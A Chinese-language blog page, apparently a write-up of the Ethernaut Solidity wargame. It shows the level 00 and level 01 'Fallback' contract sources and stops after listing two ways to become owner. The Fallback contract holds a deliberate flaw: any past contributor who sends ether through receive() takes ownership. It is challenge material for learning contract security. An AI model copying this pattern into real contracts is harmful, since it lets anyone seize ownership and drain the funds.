<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="f4tb3e">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2023/10/07/ethernaut-wp/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="Ethernaut靶场做题笔记，正在紧张有序地更新中">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut WP _持续更新中。。。">
<meta property="og:url" content="http://example.com/2023/10/07/Ethernaut-wp/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Ethernaut靶场做题笔记，正在紧张有序地更新中">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090302300.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090306707.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090306959.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092105719.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092105679.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071410829.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092155107.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092156103.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092311131.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092329572.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092329101.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092331871.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121825627.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121826811.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121827656.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309061646160.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309061647466.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071205880.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071220732.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071222831.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071441474.png">
<meta property="og:image" content="c:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20230907143851572.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071550611.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071550282.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309082340847.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309081451828.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310200456079.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310230142626.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310230249848.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310241010622.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291626269.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291631672.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291637508.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291638236.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291651820.png">
<meta property="og:image" content="c:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20231129165531255.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311292140786.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300207236.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300312620.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300312156.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300321502.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300323303.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311301346739.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312041300675.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312041301056.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312051117752.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061024264.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061136843.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061159713.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061201645.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061203613.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061206447.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061211391.jpg">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061527430.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061529478.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061533314.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402062044128.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402071620819.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402071734294.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403070106661.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403070112218.png">
<meta property="og:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403091449397.png">
<meta property="article:published_time" content="2023-10-07T04:00:00.000Z">
<meta property="article:modified_time" content="2024-03-15T03:34:00.825Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="solidity">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090302300.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311061857527.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311061857527.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311061857527.png">
    <!--- Page Info-->
    
    <title>
        
            Ethernaut WP _持续更新中。。。 -
        
        f4tb3e&#39;s Blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
        <style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    
<script src="/js/libs/anime.min.js"></script>

    <h1 class="ml13">
        f4tb3e&#39;s Blog
    </h1>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });


        anime.timeline({loop: true})
            .add({
                targets: '.ml13 .letter',
                translateY: [100,0],
                translateZ: 0,
                opacity: [0,1],
                easing: "easeOutExpo",
                duration: 1400,
                delay: (el, i) => 300 + 30 * i
            }).add({
            targets: '.ml13 .letter',
            translateY: [0,-100],
            opacity: [1,0],
            easing: "easeInExpo",
            duration: 1200,
            delay: (el, i) => 100 + 30 * i
        });

        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
        });

        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
        hidePreloaderAfterTimeout(5000);

        function hidePreloaderAfterTimeout(delay) {
            setTimeout(function () {
                var preloader = document.querySelector('.preloader');
                preloader.style.opacity = '0';
                setTimeout(function () {
                    preloader.style.display = 'none';
                }, 200);
            }, delay);
        }
    </script>
</div>
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    <!--- Font Part-->
    
    
    
    


    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Here is f4tb3e!","subtitle":{"text":["My dad has a GT-R!","Dude, is that a Supra?","夏树，叔叔要加速咯"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":80,"backing_speed":60,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/6 12:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">

    <div class="navbar-content ">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311061840946.gif">
                </a>
            
            <a class="logo-title" href="/">
                
                f4tb3e&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories"
                                        >
                                    <i class="fa-regular fa-folder fa-fw"></i>
                                    CATEGORIES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/about"
                                        >
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    ABOUT
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories"
                        >
                            <span>
                                CATEGORIES
                            </span>
                            
                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/about"
                        >
                            <span>
                                ABOUT
                            </span>
                            
                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                
                
                <img src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311071255865.png" alt="Ethernaut WP _持续更新中。。。" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
                
                <div class="w-full flex items-center absolute bottom-0 justify-start">
                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">Ethernaut WP _持续更新中。。。</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202305191441958.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">f4tb3e</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2023-10-07 12:00</span>
        <span class="mobile">2023-10-07 12:00</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-03-15 11:34</span>
            <span class="mobile">2024-03-15 11:34</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/solidity/">solidity</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h2 id="00-Hello-Ethernaut"><a href="#00-Hello-Ethernaut" class="headerlink" title="00 Hello Ethernaut"></a>00 Hello Ethernaut</h2><p>这是引导的关卡，只需要配置好 MetaMask ，支付一些测试币，然后在控制台与合约进行互动，即可过关。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line"></span><br><span class="line">  string public password;</span><br><span class="line">  uint8 public infoNum = 42;</span><br><span class="line">  string public theMethodName = &#x27;The method name is method7123949.&#x27;;</span><br><span class="line">  bool private cleared = false;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _password) &#123;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;You will find what you need in info1().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info1() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&#x27;hello&#x27;))) &#123;</span><br><span class="line">      return &#x27;The property infoNum holds the number of the next info method to call.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#x27;Wrong parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info42() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;theMethodName is the name of the next method.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;If you know the password, submit it to authenticate().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function authenticate(string memory passkey) public &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">      cleared = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCleared() public view returns (bool) &#123;</span><br><span class="line">    return cleared;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="01-Fallback"><a href="#01-Fallback" class="headerlink" title="01 Fallback"></a>01 Fallback</h2><p>这是一道白盒题目，源码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>题目要求：</p>
<ul>
<li>获得这个合约的所有权</li>
<li>把它的余额减到0</li>
</ul>
<p>分析源码，成为合约的 owner 有两种方式：</p>
<ol>
<li>通过不停贡献合约，使当前用户贡献值大于 owner</li>
<li>在已有贡献记录的前提下，向合约发送大于零的以太币</li>
</ol>
